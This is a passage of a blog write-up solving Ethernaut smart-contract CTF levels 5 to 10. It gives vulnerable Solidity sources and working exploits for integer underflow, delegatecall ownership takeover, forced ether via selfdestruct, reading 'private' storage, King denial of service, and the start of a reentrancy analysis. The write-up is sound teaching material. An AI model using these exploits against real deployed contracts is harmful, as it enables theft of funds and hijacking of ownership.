</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">changeOwner</span>(<span style="color:#a6e22e">account</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">account</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>In [<span style="color:#ae81ff">8</span>]<span style="color:#f92672">:</span> w3.eth.<span style="color:#a6e22e">getStorageAt</span>(w3.<span style="color:#a6e22e">toChecksumAddress</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A</span><span style="color:#960050;background-color:#1e0010">&#39;</span>),<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">:</span> <span style="color:#a6e22e">HexBytes</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span></code></pre></div><h1 id="level-5-token">Level 5. Token<a hidden class="anchor" aria-hidden="true" href="#level-5-token">#</a></h1>
<p>一开始也是没有注意到有整数溢出，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 和<code>require(balances[msg.sender] &gt;= _vale);</code>这两个是不一样的。</p>
<p>第一个是先做了减法运算的，然后和0进行比较，而第二个是两个数直接进行比较。</p>
<p>注意转账的接收方不能是自己，不然溢出之后又溢出回来了。</p>
<h1 id="level-6-delegation">Level 6. Delegation<a hidden class="anchor" aria-hidden="true" href="#level-6-delegation">#</a></h1>
<blockquote>
<p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code>msg.sender</code> and <code>msg.value</code> do not change their values.</p>
<p>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.</p>
<p>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure.</p>
</blockquote>
<p><code>&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)</code></p>
<p>issue low-level DELEGATECALL with the given payload, returns success condition and return data, forwards all available gas, adjustable</p>
<h2 id="source">Source<a hidden class="anchor" aria-hidden="true" href="#source">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Delegate</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_owner</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_owner</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Delegation</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Delegate</span> <span style="color:#a6e22e">delegate</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_delegateAddress</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">delegate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Delegate</span>(<span style="color:#a6e22e">_delegateAddress</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> {
</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">data</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">delegate</span>).<span style="color:#a6e22e">delegatecall</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The instance must be the <code>Delegation</code> contract.</p>
<p>The fallback function of <code>Delegation</code> contract trys to call the delegate address.</p>
<p>And the <code>Delegate</code> contract has a pwn function that can change its ower to <code>msg.sender</code> . Since the delegatecall will not change <code>msg.sener</code>, we can change the owner to our attacker address.</p>
<p>Notice that delegatecall only copys code from the target address to the current contract and executes, so the effect of doing the <code>pwn()</code> function is changing <code>contract Delegation</code> &rsquo;s owner variable, which are all at <code>storage[0]</code>.</p>
<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
<p>just call the fallback function of the <code>Delegation</code> contract, and msg.data set to <code>keccack('pwn()') = 0xdd365b8b</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">data</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0xdd365b8b&#34;</span>})
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>()
</span></span></code></pre></div><h1 id="level-7-force">Level 7. Force<a hidden class="anchor" aria-hidden="true" href="#level-7-force">#</a></h1>
<blockquote>
<p>Some contracts will simply not take your money ¯_(ツ)_/¯</p>
</blockquote>
<blockquote>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
</blockquote>
<h2 id="source-1">Source<a hidden class="anchor" aria-hidden="true" href="#source-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Force</span> {<span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                   MEOW ?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         /\_/\   /
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ____/ o o \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  /~____  =ø= /
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (______)__m_m)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>}
</span></span></code></pre></div><h2 id="decompiled">Decompiled<a hidden class="anchor" aria-hidden="true" href="#decompiled">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Contract</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x60</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">revert</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x00</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>so the default fallback generated is simply revert.</p>
<p>Well i have no idea, so I searched for other people&rsquo;s wp.</p>
<blockquote>
<p>强行将以太币置入合约的相关方式：1. 通过自毁、2. 创建前预先发送Ether、3. 为其挖矿。</p>
</blockquote>
<h2 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h2>
<p>I first forget to mark the contructor payable, and remix gives me kindly warnings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>creation of Hacker errored: VM error: revert. revert The transaction has been reverted to the initial state. Note: The called function should be payable if you send value and the value you send should be less than your current balance. Debug the transaction to get more information.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-3.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0x2CcA84F27Bc45eFEEDce279C7c6dF6D0D02186b4</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-8-vault">Level 8. Vault<a hidden class="anchor" aria-hidden="true" href="#level-8-vault">#</a></h1>
<blockquote>
<p>Unlock the vault to pass the level!</p>
</blockquote>
<h2 id="source-2">Source<a hidden class="anchor" aria-hidden="true" href="#source-2">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Vault</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">locked</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bytes32</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">password</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_password</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_password</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_password</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">password</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">_password</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h2>
<p>no secret on blockchain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> web3.auto.infura.rinkeby <span style="color:#f92672">import</span> w3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">2</span>]: public <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x817d3fcDf81E62AaaA1caf5e8CBD9b1417346d65&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">3</span>]: addr <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>toChecksumAddress(public)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">4</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(addr,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">4</span>]: HexBytes(<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">5</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(addr,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">5</span>]: HexBytes(<span style="color:#e6db74">&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#e6db74">&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">6</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(addr,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">6</span>]: HexBytes(<span style="color:#e6db74">&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span>)
</span></span></code></pre></div><h1 id="level-9-king">Level 9. King<a hidden class="anchor" aria-hidden="true" href="#level-9-king">#</a></h1>
<blockquote>
<p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p>
</blockquote>
<blockquote>
<p>Such a fun game. Your goal is to break it.</p>
</blockquote>
<blockquote>
<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
</blockquote>
<h2 id="source-3">Source<a hidden class="anchor" aria-hidden="true" href="#source-3">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">King</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">king</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">prize</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;  
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">king</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">prize</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">owner</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">king</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">king</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_king</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">king</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>没看懂题目是啥意思，我的目标是什么，看了<a href="https://cloud.tencent.com/developer/article/1632036">wp</a></p>
<p>注意到owner变量是不会改变的，所以说owner总是可以重新取回king的身份，目标是成为king并且保持king的身份。</p>
<blockquote>
<p>The transfer function fails if the balance of the current contract is not large enough or if the Ether transfer is rejected by the receiving account. The transfer function reverts on failure.</p>
</blockquote>
<p>transfer在失败的时候会回滚，所以只要我们不接受transfer就可以阻值代码的继续执行。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-3.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>, <span style="color:#e6db74">&#34;please give 1 ether&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xAc3c199067eB0Cb9a27A8230A1447865F35b4Ff6</span>;
</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">_res</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>}(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#e6db74">&#34;&#34;</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-10-re-entrancy">Level 10. Re-entrancy<a hidden class="anchor" aria-hidden="true" href="#level-10-re-entrancy">#</a></h1>
<blockquote>
<p>The goal of this level is for you to steal all the funds from the contract.</p>
</blockquote>
<blockquote>
<p>Things that might help:</p>
</blockquote>
<blockquote>
<blockquote>
<p>Untrusted contracts can execute code where you least expect it.<br>
Fallback methods<br>
Throw/revert bubbling<br>
Sometimes the best way to attack a contract is with another contract.<br>
See the Help page above, section &ldquo;Beyond the console&rdquo;</p>
</blockquote>
</blockquote>
<h2 id="source-4">Source<a hidden class="anchor" aria-hidden="true" href="#source-4">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Reentrance</span> {
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint256</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">balances</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>].<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_who</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">balance</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_who</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_amount</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">_amount</span>) {
</span></span><span style="display:flex;"><span>      (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">data</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>.<span style="color:#a6e22e">value</span>(<span style="color:#a6e22e">_amount</span>)(<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_amount</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">-=</span> <span style="color:#a6e22e">_amount</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>target: <code>0x22778878428C001234BC0d9A708D9664045d80BC</code></p>
<h2 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h2>
<p>Originally, there was 1 ether in the contract, so our goal is to transfer this 1 ether back to our account.</p>
<p><a href="https://ethereum.stackexchange.com/questions/19341/address-send-vs-address-transfer-best-practice-usage"><code>address.transfer</code> is safe</a> as it has a gas stipend of 2300. but <code>address.call.value().gas()()</code> forwards all available gas (adjustable), and is not safe against reentrancy. Here is <a href="https://medium.com/daox/three-methods-to-transfer-funds-in-ethereum-by-means-of-solidity-5719944ed6e9">another reading.</a></p>
<p>奥，我明白了，我总是试图在constructor函数中就完成整个exp链的构造，但是在这个时候我的各个编写的函数是还不存在的，我的fallack函数也不存在。所以这一题要利用fallback函数的话是不能够在一个constructor函数中就完成的，必须要在整个合约部署完成之后，再发起第二笔交易来进行攻击。所以说这题至少也需要两笔交易完成攻击。</p>
<p>关于<a href="https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity">receive关键字</a>。</p>
<p>值得注意的是即便被攻击合约中写的是<code>msg.sender.call.value(_amount)(&quot;&quot;);</code>，但是还是call了receive函数，也就是没有calldata。实验发现在fallback函数和receive函数同时存在的情况下会调用receive函数。</p>
<p>从<a href="https://ethervm.io/decompile/rinkeby/0x22778878428C001234BC0d9A708D9664045d80BC">反编译结果</a>来看也是没有calldata。</p>
